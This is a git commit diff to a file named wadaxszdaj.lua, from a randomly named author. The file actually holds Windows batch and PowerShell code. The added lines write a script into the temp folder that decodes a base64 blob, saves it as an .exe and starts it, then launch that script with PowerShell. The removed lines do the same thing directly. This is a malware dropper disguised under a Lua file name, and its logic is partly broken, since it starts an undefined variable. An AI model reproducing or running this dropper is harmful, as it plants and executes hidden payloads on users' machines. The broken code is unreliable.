44ec69e4c35c8b0d0e002d365597e8f7cec2abf7
k39gbwldsn3 <demixhack5@gmail.com>
2025-04-06 14:33:16 +0300

    Update wadaxszdaj.lua

--- wadaxszdaj.lua
+++ wadaxszdaj.lua
@@ -1,6 +1,8 @@
-$base64 = "0J/RgNC+0YHRgtC+INGC0LXRgdGCLCDQtdGB0LvQuCDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0LfQsNC80LXQvdGOINC90LAg0YDQtdCw0LvRjNC90YvQuSDQutC+0LQK0KPQsdGA0LDQuyDRh9GC0L4t0LHRiyDRgtGLINC90LUg0LTRg9C80LDQuyDQv9C+0Lsg0LPQvtC00LAgOik="
-$bytes = [Convert]::FromBase64String($base64)
-$text = [System.Text.Encoding]::Unicode.GetString($bytes)
-$e = "$env:TEMP\wkfpzmwopynsowntovmsxp.exe"
-[IO.File]::WriteAllText($e, $text, [System.Text.Encoding]::Unicode)
-Start-Process $exePath
+@echo $base64 = "0J/RgNC+0YHRgtC+INGC0LXRgdGCLCDQtdGB0LvQuCDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0LfQsNC80LXQvdGOINC90LAg0YDQtdCw0LvRjNC90YvQuSDQutC+0LQK0KPQsdGA0LDQuyDRh9GC0L4t0LHRiyDRgtGLINC90LUg0LTRg9C80LDQuyDQv9C+0Lsg0LPQvtC00LAgOik=" >> %temp%\wio4nfosn4otnsa.ps1
+@echo $bytes = [Convert]::FromBase64String($base64) >> %temp%\wio4nfosn4otnsa.ps1
+@echo $text = [System.Text.Encoding]::Unicode.GetString($bytes) >> %temp%\wio4nfosn4otnsa.ps1
+@echo $e = "$env:TEMP\wkfpzmwopynsowntovmsxp.exe" >> %temp%\wio4nfosn4otnsa.ps1
+@echo [IO.File]::WriteAllText($e, $text, [System.Text.Encoding]::Unicode) >> %temp%\wio4nfosn4otnsa.ps1
+@echo Start-Process $exePath >> %temp%\wio4nfosn4otnsa.ps1
+
+start powershell.exe %temp%\wio4nfosn4otnsa.ps1
